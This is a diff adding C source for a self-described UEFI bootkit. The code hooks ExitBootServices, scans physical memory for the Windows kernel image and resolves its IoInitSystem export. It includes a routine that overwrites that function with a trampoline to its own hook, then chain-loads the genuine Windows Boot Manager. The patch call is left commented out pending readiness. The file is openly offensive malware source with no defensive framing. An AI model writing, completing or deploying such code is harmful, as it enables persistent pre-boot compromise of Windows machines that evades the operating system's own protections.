@@ -1,0 +1,205 @@
+#include <Uefi.h>
+#include <Library/UefiLib.h>
+#include <Library/UefiBootServicesTableLib.h>
+#include <Library/UefiBootManagerLib.h>
+#include <Library/DevicePathLib.h>
+#include <Library/MemoryAllocationLib.h>
+#include <Library/BaseMemoryLib.h>
+#include <Library/BaseLib.h>
+#include <Library/DebugLib.h>
+#include <Guid/EventGroup.h>
+#include <IndustryStandard/PeImage.h>
+
+EFI_EVENT gExitBootServicesEvent = NULL;
+
+UINT64 gKernelBase = 0;
+UINT64 gIoInitSystem = 0;
+UINT8  gOriginalBytes[32];
+UINTN  gBackupSize = 24;
+
+// ============================================================
+// Find ntoskrnl base
+UINT64 FindKernelBase(void)
+{
+    UINTN MapSize = 0, MapKey, DescriptorSize;
+    UINT32 DescriptorVersion;
+    EFI_MEMORY_DESCRIPTOR *MemoryMap = NULL;
+
+    if (gBS->GetMemoryMap(&MapSize, NULL, &MapKey, &DescriptorSize, &DescriptorVersion) != EFI_BUFFER_TOO_SMALL)
+        return 0;
+
+    MapSize += DescriptorSize * 128;
+    MemoryMap = AllocatePool(MapSize);
+    if (!MemoryMap) return 0;
+
+    gBS->GetMemoryMap(&MapSize, MemoryMap, &MapKey, &DescriptorSize, &DescriptorVersion);
+
+    Print(L"[BOOTKIT] Scanning for ntoskrnl...\n");
+
+    for (UINTN i = 0; i < MapSize / DescriptorSize; i++) {
+        EFI_MEMORY_DESCRIPTOR *Desc = (EFI_MEMORY_DESCRIPTOR*)((UINT8*)MemoryMap + i * DescriptorSize);
+
+        if (Desc->Type != EfiLoaderCode && Desc->Type != EfiLoaderData &&
+            Desc->Type != EfiBootServicesCode && Desc->Type != EfiBootServicesData)
+            continue;
+
+        UINT64 Start = Desc->PhysicalStart;
+        UINT64 End   = Start + (Desc->NumberOfPages * EFI_PAGE_SIZE);
+
+        for (UINT64 Addr = Start; Addr < End - 0x1000; Addr += 0x1000) {
+            if (*(UINT16*)Addr == 0x5A4D) {
+                UINT32 PeOffset = *(UINT32*)(Addr + 0x3C);
+                if (PeOffset < 0x1000 && *(UINT32*)(Addr + PeOffset) == 0x00004550) {
+                    Print(L"[BOOTKIT] >>> KERNEL BASE FOUND: %p <<<\n", (VOID*)Addr);
+                    FreePool(MemoryMap);
+                    return Addr;
+                }
+            }
+        }
+    }
+
+    FreePool(MemoryMap);
+    return 0;
+}
+
+// ============================================================
+// Find export by name
+UINT64 FindExport(UINT64 ImageBase, CONST CHAR8 *FunctionName)
+{
+    if (!ImageBase) return 0;
+
+    EFI_IMAGE_DOS_HEADER *Dos = (EFI_IMAGE_DOS_HEADER*)ImageBase;
+    if (Dos->e_magic != EFI_IMAGE_DOS_SIGNATURE) return 0;
+
+    EFI_IMAGE_NT_HEADERS64 *Nt = (EFI_IMAGE_NT_HEADERS64*)(ImageBase + Dos->e_lfanew);
+    if (Nt->Signature != EFI_IMAGE_NT_SIGNATURE) return 0;
+
+    EFI_IMAGE_DATA_DIRECTORY *ExportDir = &Nt->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT];
+    if (ExportDir->VirtualAddress == 0) return 0;
+
+    EFI_IMAGE_EXPORT_DIRECTORY *Export = (EFI_IMAGE_EXPORT_DIRECTORY*)(ImageBase + ExportDir->VirtualAddress);
+
+    UINT32 *NameRva = (UINT32*)(ImageBase + Export->AddressOfNames);
+    UINT16 *OrdRva  = (UINT16*)(ImageBase + Export->AddressOfNameOrdinals);
+    UINT32 *FuncRva = (UINT32*)(ImageBase + Export->AddressOfFunctions);
+
+    for (UINT32 i = 0; i < Export->NumberOfNames; i++) {
+        CHAR8 *Name = (CHAR8*)(ImageBase + NameRva[i]);
+        if (AsciiStrCmp(Name, FunctionName) == 0) {
+            UINT16 Ordinal = OrdRva[i];
+            return ImageBase + FuncRva[Ordinal];
+        }
+    }
+    return 0;
+}
+
+// ============================================================
+// IoInitSystem Hook
+VOID EFIAPI IoInitSystemHook(VOID)
+{
+    Print(L"\n[BOOTKIT] >>> IoInitSystemHook CALLED FROM KERNEL! <<<\n");
+    Print(L"[BOOTKIT] Kernel control achieved!\n");
+
+    CopyMem((VOID*)gIoInitSystem, gOriginalBytes, gBackupSize);
+}
+
+// ============================================================
+// Patch IoInitSystem
+VOID PatchIoInitSystem(UINT64 IoInitSystemAddr)
+{
+    if (!IoInitSystemAddr) return;
+
+    gIoInitSystem = IoInitSystemAddr;
+    CopyMem(gOriginalBytes, (VOID*)IoInitSystemAddr, gBackupSize);
+
+    UINT8 Trampoline[] = {
+        0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x41, 0x52,
+        0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x41, 0xFF, 0xE2
+    };
+
+    *(UINT64*)(Trampoline + 2)  = IoInitSystemAddr;
+    *(UINT64*)(Trampoline + 12) = (UINT64)IoInitSystemHook;
+
+    CopyMem((VOID*)IoInitSystemAddr, Trampoline, sizeof(Trampoline));
+
+    Print(L"[BOOTKIT] >>> IoInitSystem PATCHED WITH RETPOLINE <<<\n");
+}
+
+// ============================================================
+// ExitBootServices hook
+VOID EFIAPI OnExitBootServices(IN EFI_EVENT Event, IN VOID *Context)
+{
+    (void)Event; (void)Context;
+
+    Print(L"\n[BOOTKIT] ========================================\n");
+    Print(L"[BOOTKIT] EXITBOOT SERVICES TRIGGERED - KERNEL STAGE\n");
+    Print(L"[BOOTKIT] ========================================\n");
+
+    gBS->Stall(1000000);
+
+    gKernelBase = FindKernelBase();
+    if (gKernelBase) {
+        gIoInitSystem = FindExport(gKernelBase, "IoInitSystem");
+        if (gIoInitSystem) {
+            Print(L"[BOOTKIT] IoInitSystem found at %p\n", (VOID*)gIoInitSystem);
+            // PatchIoInitSystem(gIoInitSystem);   // UNCOMMENT WHEN READY
+        } else {
+            Print(L"[BOOTKIT] IoInitSystem NOT found!\n");
+        }
+    }
+
+    gBS->Stall(2000000);
+}
+
+// ============================================================
+// Manually boot real Windows Boot Manager
+EFI_STATUS BootRealWindows(VOID)
+{
+    EFI_DEVICE_PATH_PROTOCOL *Dp = FileDevicePath(NULL, L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi");
+    if (!Dp) {
+        Print(L"[BOOTKIT] FileDevicePath failed\n");
+        return EFI_OUT_OF_RESOURCES;
+    }
+
+    EFI_BOOT_MANAGER_LOAD_OPTION Option;
+    ZeroMem(&Option, sizeof(Option));
+
+    Option.FilePath    = Dp;
+    Option.Description = L"Windows Boot Manager";
+    Option.Attributes  = LOAD_OPTION_ACTIVE | LOAD_OPTION_CATEGORY_BOOT;
+    Option.OptionType  = LoadOptionTypeBoot;
+
+    Print(L"[BOOTKIT] Manually booting real Windows Boot Manager...\n");
+    EFI_STATUS Status = EfiBootManagerBoot(&Option);
+
+    FreePool(Dp);
+
+    if (EFI_ERROR(Status)) {
+        Print(L"[BOOTKIT] EfiBootManagerBoot failed: %r\n", Status);
+    }
+
+    return Status;
+}
+
+// ============================================================
+// Entry Point
+EFI_STATUS EFIAPI UefiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable)
+{
+    EFI_STATUS Status;
+
+    Status = gBS->CreateEventEx(EVT_NOTIFY_SIGNAL, TPL_NOTIFY, OnExitBootServices,
+                                NULL, &gEfiEventExitBootServicesGuid, &gExitBootServicesEvent);
+
+    if (!EFI_ERROR(Status)) {
+        Print(L"[BOOTKIT] ExitBootServices hook registered\n");
+    }
+
+    Print(L"[BOOTKIT] Bootkit Loaded - Preparing to boot real Windows...\n");
+    gBS->Stall(1200000);
+
+    BootRealWindows();
+
+    return EFI_SUCCESS;
+}
